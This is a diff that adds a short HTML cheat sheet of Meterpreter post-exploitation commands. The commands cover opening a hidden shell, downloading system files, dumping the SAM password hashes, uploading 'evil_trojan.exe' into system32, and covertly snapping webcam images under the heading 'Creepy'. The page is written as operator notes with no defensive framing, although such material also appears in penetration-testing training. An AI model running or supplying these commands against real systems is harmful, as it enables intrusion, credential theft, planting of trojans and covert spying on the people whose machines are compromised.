@@ -1,0 +1,46 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>meterpreter</title>
+</head><body>## Drop into a shell<br/>
+shell<br/>
+<br/>
+##background the processes<br/>
+crtl z<br/>
+<br/>
+##download<br/>
+﻿<span style="color: #13c16a">download c:\\boot.ini</span>&nbsp; &nbsp;<br/>
+<br/>
+<br/>
+##edit<br/>
+﻿<span style="color: #13c16a">edit edit.txt</span>&nbsp; &nbsp;<br/>
+<br/>
+<br/>
+##execute<br/>
+﻿ <span style="color: #13c16a">execute -f cmd.exe -i -H</span>&nbsp; &nbsp;<br/>
+<br/>
+<br/>
+##get the user info<br/>
+getuid<br/>
+<br/>
+<br/>
+##get the post module dump of the contents of the sam database<br/>
+﻿<span style="color: #13c16a">run post/windows/gather/hashdump</span>&nbsp; &nbsp; <br/>
+<br/>
+##running processes<br/>
+ps<br/>
+<br/>
+<br/>
+##upload<br/>
+﻿<span style="color: #13c16a">upload evil_trojan.exe c:\\windows\\system32</span>&nbsp; &nbsp;<br/>
+<br/>
+##Creepy<br/>
+﻿webcam_list &nbsp;<br/>
+﻿<u>meterpreter</u>&nbsp;&gt; <span style="color: #13c16a">webcam_snap -h</span>&nbsp; &nbsp;<br/>
+﻿meterpreter &gt; webcam_snap -i 1 -v false &nbsp; <br/>
+<br/>
+<br/>
+##list everything<br/>
+<br/>
+dir -lR</body></html>
